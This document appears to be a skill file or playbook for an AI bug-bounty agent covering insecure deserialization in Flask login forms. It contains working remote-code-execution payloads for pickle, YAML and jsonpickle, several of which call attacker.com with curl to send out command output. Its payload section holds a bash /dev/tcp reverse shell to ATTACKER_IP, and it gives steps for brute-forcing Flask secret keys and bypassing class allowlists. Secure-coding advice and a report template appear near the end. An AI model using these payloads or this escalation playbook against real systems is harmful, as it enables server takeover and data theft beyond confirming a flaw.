# 🥒 Flask Login Form – Insecure Deserialization – AI Bug Bounty Skill

## Skill Name
`flask-insecure-deserialization-login`

## Description
Advanced detection and exploitation of insecure deserialization vulnerabilities in Python Flask login forms. This skill analyses how the application processes serialized data – in cookies, POST parameters, hidden fields, `remember_me` tokens, password reset tokens, or backend session stores – during authentication. When the server accepts and deserializes attacker‑crafted payloads using unsafe serializers (`pickle`, `yaml.load`, `jsonpickle`, `marshal`, `shelve`), it can lead to arbitrary code execution, authentication bypass, session hijacking, or privilege escalation. The skill covers both black‑box blind payload delivery and static code analysis patterns.

## Affected Components
- **Flask session cookie deserialization** when using `PickleSerializer` instead of the default `TaggedJSONSerializer`:
  ```python
  from flask.sessions import SecureCookieSessionInterface, PickleSerializer
  app.session_interface.serializer = PickleSerializer()
  ```
- **`pickle.loads()` / `cPickle.loads()`** on user‑controlled data (cookies, POST body, headers, URL parameters) in the login flow.
- **`yaml.load()` (unsafe YAML)** used to parse login‑related configuration, user data, or request payloads (e.g., `yaml.load(request.data)` for JSON‑like login requests).
- **`jsonpickle.decode()`** or `jsonpickle.loads()` on data from the client.
- **`marshal.loads()`** (Python bytecode deserialization, less common but possible).
- **`shelve` module** where an attacker can place a malicious object in a persistent store accessed during login.
- **Third‑party session libraries** that use pickle (e.g., some Redis or memcached session backends if the app serializes objects before storing).
- **Custom “remember me” tokens** that are pickled, Base64‑encoded, and stored in a cookie; the server unpickles them on login.
- **Password reset tokens** sent as serialized objects (e.g., `{"user": "admin", "exp": ...}` pickled).
- **Any login parameter** named `data`, `payload`, `state`, `token`, `session`, `sig`, `v` that is passed to a deserialization function.

## Detection Patterns (Static & Dynamic)
### 1. Pickle Deserialization in Session Handling
- **Code heuristic**: `PickleSerializer`, `pickle.loads`, `cPickle.loads` used in session handling or login routes.
- **Dynamic test**: The default Flask session cookie is signed with `itsdangerous` and uses JSON; if an RCE payload in the cookie causes a 500 error or code execution, the serializer is likely pickle. Craft a malicious pickle payload, sign it with the secret key (if known) or attempt to exploit blind.

### 2. Direct Deserialization of Login Data
- **Example**: `user = pickle.loads(base64.b64decode(request.form['user_obj']))`
- **Heuristic**: Presence of `loads`/`load` functions from `pickle`, `_pickle`, `yaml` (without `SafeLoader`), `jsonpickle`, `marshal` in authentication logic.
- **Dynamic test**: Submit a crafted serialized payload in the suspected parameter; monitor for time delays, out‑of‑band callbacks, or unexpected behaviour indicating code execution.

### 3. Unsafe YAML Deserialization
- **Heuristic**: `yaml.load(request.data, Loader=yaml.Loader)` (or without Loader argument, defaults to unsafe in PyYAML < 6.0).
- **Dynamic test**: Send a YAML payload like `!!python/object/apply:os.system ["id"]` in a JSON‑looking body (e.g., `{'username': '!!python/object/apply:os.system ['id']'}`). If the command runs, YAML deserialization is present.

### 4. `jsonpickle` or `marshal` Deserialization
- **`jsonpickle`**: Objects serialized as JSON with `{"py/object": "__main__.Exploit", ...}`. The login endpoint may accept such JSON and decode it with `jsonpickle.decode()`.
- **`marshal`**: More obscure; if the app uses `marshal.loads()` on a Base64‑encoded value, execution of arbitrary code is possible via crafted bytecode (Python version‑specific).

### 5. Blind Deserialization
- No visible output, but time‑based detection: `time.sleep(10)` command.
- Out‑of‑band detection: `curl http://attacker.com/` or DNS callback.
- If RCE is achieved, exfiltrate data or create a file to prove exploitation.

## Testing Methodology (AI Agent Steps)
1. **Identify Serialization Points**
   - Inspect login form hidden fields, cookie values, and any encoded parameters (Base64, hex). Try decoding common encodings.
   - Look for parameters like `token`, `state`, `session`, `remember`, `data`, `serialized`, `payload`.
   - Check if the login endpoint accepts content types like `application/x‑python‑pickle`, `text/x‑yaml`, or custom binary data.

2. **Fingerprint Serializer**
   - For pickle: a Base64 string starting with `gASV` (protocol 0) or containing `(S'...'` patterns after decoding.
   - For YAML: strings containing `!!python/object`, `!!python/name`.
   - For jsonpickle: JSON objects with keys `py/object`, `py/type`, etc.
   - Use a collaborator to see if the server processes the data and what errors it returns.

3. **Craft Malicious Payloads**
   - **Pickle RCE (Python 3)**
     ```python
     import pickle
     import os
     import base64
     class RCE:
         def __reduce__(self):
             return (os.system, ('curl http://attacker.com/$(whoami)',))
     payload = base64.b64encode(pickle.dumps(RCE())).decode()
     ```
   - **YAML RCE**
     ```yaml
     !!python/object/apply:os.system
     args: ["id"]
     ```
   - **jsonpickle RCE**
     ```json
     {"py/object": "__main__.Exploit", "py/reduce": [{"py/type": "os.system"}, {"py/tuple": ["curl http://attacker.com/"]}]}
     ```
   - **marshal RCE** (Python version‑dependent, usually requires a gadget chain; often combined with `types.FunctionType`).

4. **Deliver Payloads**
   - For cookie‑based deserialization, replace the session cookie with the Base64‑encoded pickle payload (if you can sign it or if signature validation is disabled). Use tools like `flask-unsign` to re‑sign with a known secret.
   - For POST parameters, submit the encoded payload in the identified field.
   - If the payload is reflected, try blind OOB techniques.

5. **Bypass Defences**
   - **Whitelist filters**: If the server restricts classes, use gadget chains with allowed classes (e.g., `subprocess.Popen`, `os.system` might be blocked but `builtins.exec` could work).
   - **Signature checks**: If the session cookie is signed, try to brute‑force the Flask secret key using wordlists or exposed secrets in source code (common misconfiguration). Once the key is known, sign the malicious pickle payload.
   - **Encoding tricks**: If the server expects only JSON, YAML can be embedded within a JSON value: `{"username": "!!python/object/apply:os.system ['id']"}` – if the value is later deserialized as YAML.

6. **Exploit Confirmation**
   - Use OOB (DNS/HTTP) callbacks to confirm execution.
   - If the server returns the output of `id` or `whoami`, capture it.
   - Establish a reverse shell for deeper access.

## Essential Payloads (Flask Insecure Deserialization)
### Pickle Payload (RCE via reverse shell)
Generate with Python:
```python
import pickle, os, base64
class Exploit:
    def __reduce__(self):
        cmd = "bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"
        return (os.system, (cmd,))
payload = base64.b64encode(pickle.dumps(Exploit())).decode()
```
### YAML Payload
```yaml
!!python/object/apply:subprocess.Popen
- ["curl", "http://attacker.com/?c=$(id)"]
```
### jsonpickle Payload
```json
{
  "py/reduce": [
    {"py/function": "os.system"},
    {"py/tuple": ["curl http://attacker.com/$(uname -a)"]}
  ]
}
```
### Session Cookie Exploit (if secret is known)
- Use `flask-unsign` to craft a session cookie with a pickled payload after replacing serializer.
- Or directly sign the pickle payload with the secret using `itsdangerous`.

## Secure Coding Recommendations
- **Never deserialize untrusted data with `pickle`, `yaml.load()` (without `SafeLoader`), `jsonpickle`, `marshal`.** Prefer JSON with `json.loads` for simple data.
- **Flask sessions**: The default `TaggedJSONSerializer` is safe. Do **not** change to `PickleSerializer`. Ensure the session secret is strong and not exposed.
- If you must accept serialized objects, use a secure, restricted format and apply strict allowlists for allowed classes. Consider using `hmac` to sign the data and verify integrity before deserialization.
- **YAML**: Use `yaml.safe_load()` or `yaml.load(data, Loader=yaml.SafeLoader)`.
- **Avoid passing user‑controlled data to any deserialization function.**
- Keep dependencies updated (e.g., PyYAML >= 6.0 defaults to SafeLoader, but still explicitly use safe loading).
- Implement WAF rules to detect deserialization payload patterns.
- Run the application with minimal privileges to limit impact of successful RCE.

## Output Format (Bug Report)
```
Title: Insecure Deserialization in Login Token Leads to Remote Code Execution
Severity: Critical (CVSS 10.0)
Endpoint: POST /login
Vulnerable Parameter: remember_token cookie / POST parameter
Description:
  The login endpoint deserializes a user‑supplied `remember_token` using `pickle.loads()` without any integrity check. An attacker can craft a malicious pickle payload, encode it, and submit it to execute arbitrary commands on the server.
Proof of Concept:
  1. Generate a pickle payload that runs `curl http://attacker.com/RCE_PROOF`.
  2. Base64‑encode it.
  3. Submit to /login as the `remember_token` POST parameter.
  4. Server makes an HTTP request to the attacker's server, confirming code execution.
Remediation:
  Replace pickle with a secure token format (e.g., HMAC‑signed JSON). If session‑like, use Flask’s default signed cookie. Never deserialize untrusted data.
```

## Skill Metadata
- **Author**: AI Bug Bounty Hunter
- **Version**: 1.0
- **Target Framework**: Flask (Python) with unsafe deserialization practices
- **Testing Type**: Black-box / Grey-box (requires ability to craft serialized payloads)
- **Dependencies**: Python environment to generate payloads; out‑of‑band server for blind detection.